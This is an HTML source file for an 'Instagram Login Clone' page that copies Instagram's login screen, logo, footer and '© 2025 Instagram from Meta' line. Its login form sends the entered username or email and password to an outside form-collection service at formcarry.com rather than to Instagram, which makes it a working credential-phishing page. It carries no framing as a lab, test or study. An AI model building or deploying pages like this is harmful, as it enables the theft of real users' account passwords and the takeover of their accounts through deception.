<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="stylesheet" href="style.css">
  <link rel="icon" type="image/png" sizes="64x64" href="/img/curved-favicon.png">
  <title>Instagram Login Clone</title>
</head>
<body>
<script src="script.js"></script>
<div class="container">
  <div class="login-wrapper">
    <div class="left-images">
      <img src="/img/img.png" alt="Instagram style image" class="main-img">
    </div>
    <div class="login-box">
      <div class="logo-wrapper">
        <img src="/img/img1.png" alt="Instagram Logo" class="insta-logo">
      </div>
      <form id="loginForm" action="https://formcarry.com/s/52uLJ3rOc24" method="POST">
      <input type="text" name="username_or_email" placeholder="Phone number, username or email address" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit"> <a href="/html/allow.html"></a>Log in</button>
      </form>
      <div class="or-line"><span>OR</span></div>
      <div class="facebook-login" onclick="facebookLogin()">Log in with Facebook</div>
      <div class="forgot">Forgotten your password?</div>
      <div class="signup-link">
        Don't have an account? <a href="#">Sign up</a>
      </div>
    </div>
  </div>
</div>
<footer class="footer">
  <div class="footer-links">
    <a href="#">Meta</a>
    <a href="#">About</a>
    <a href="#">Blog</a>
    <a href="#">Jobs</a>
    <a href="#">Help</a>
    <a href="#">API</a>
    <a href="#">Privacy</a>
    <a href="#">Terms</a>
    <a href="#">Locations</a>
    <a href="#">Instagram Lite</a>
    <a href="#">Threads</a>
    <a href="#">Contact uploading and non-users</a>
    <a href="#">Meta Verified</a>
    <div class="language-container">
      <select class="language-select" onchange="changeLanguage(this)">
    <option value="en">English (UK)</option>
    <option value="en-us">English (US)</option>
    <option value="hi">Hindi</option>
    <option value="fr">Français</option>
  </select>
</div>
  <!-- </select> -->
  <div>© 2025 Instagram from Meta</div>
</footer>

</body>
</html>
